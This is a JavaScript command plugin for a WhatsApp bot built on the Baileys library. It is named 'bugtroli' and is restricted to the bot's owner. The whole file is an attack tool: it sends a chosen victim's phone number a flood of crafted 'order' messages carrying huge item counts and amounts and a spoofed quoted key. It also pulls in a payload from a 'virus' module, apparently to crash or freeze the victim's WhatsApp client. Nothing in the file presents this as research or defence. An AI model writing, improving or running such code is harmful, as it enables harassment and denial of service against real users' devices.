import arifzyn from "@adiwajshing/baileys";
import { buttonbug } from "../virus/buttonbug.js";
import fetch from "node-fetch";

const ArifzynDev = await (
  await fetch("https://telegra.ph/file/03af105d7fc19c2a7801d.jpg")
).buffer();

const {
  BufferJSON,
  WA_DEFAULT_EPHEMERAL,
  generateWAMessageFromContent,
  proto,
  generateWAMessageContent,
  generateWAMessage,
  prepareWAMessageMedia,
  areJidsSameUser,
  getContentType,
} = arifzyn;

let handler = async (m, { conn, usedPrefix, command, args }) => {
  const hw = {
    key: {
      fromMe: false,
      participant: `0@s.whatsapp.net`,
      ...(m.chat
        ? {
            remoteJid: "0@s.whatsapp.net",
          }
        : {}),
    },
    message: {
      extendedTextMessage: {
        previewType: "NONE",
        contextInfo: {
          stanzaId: "3EB0382EDBB2",
        },
      },
    },
  };

  if (!args[0])
    return m.reply(
      `Penggunaan ${usedPrefix + command} jumlah\nContoh ${
        usedPrefix + command
      } 628xxx|5`
    );
  const num = args[0].split("|")[0];
  const jumlah = args[0].split("|")[1];
  for (let i = 0; i < jumlah; i++) {
    var messa = await prepareWAMessageMedia(
      { image: ArifzynDev },
      { upload: conn.waUploadToServer }
    );
    var order = generateWAMessageFromContent(
      m.chat,
      proto.Message.fromObject({
        orderMessage: {
          orderId: "449756950375071",
          orderImage: messa.imageMessage,
          itemCount: 100000000000,
          status: "INQUIRY",
          surface: "CATALOG",
          message: `© Aridzyn${ngazap}`,
          jpegThumbnail: ArifzynDev,
          orderTitle: `© Arifzyn${ngazap}`,
          sellerJid: "6285714170944@s.whatsapp.net",
          token: "AR40+xXRlWKpdJ2ILEqtgoUFd45C8rc1CMYdYG/R2KXrSg==",
          totalAmount1000: "500000000000000",
          totalCurrencyCode: "IDR",
        },
      }),
      { userJid: m.chat, quoted: hw }
    );
    conn.relayMessage(num + "@s.whatsapp.net", order.message, {
      messageId: order.key.id,
    });
  }
  m.reply(`Berhasil Kirim Bug\n\nKe Nomor : ${num}\nJumlah : ${jumlah}`);
};
handler.help = ["bugtroli"];
handler.tags = ["bugmenu"];
handler.command = /^(bugtroli)$/i;

handler.owner = true;

export default handler;
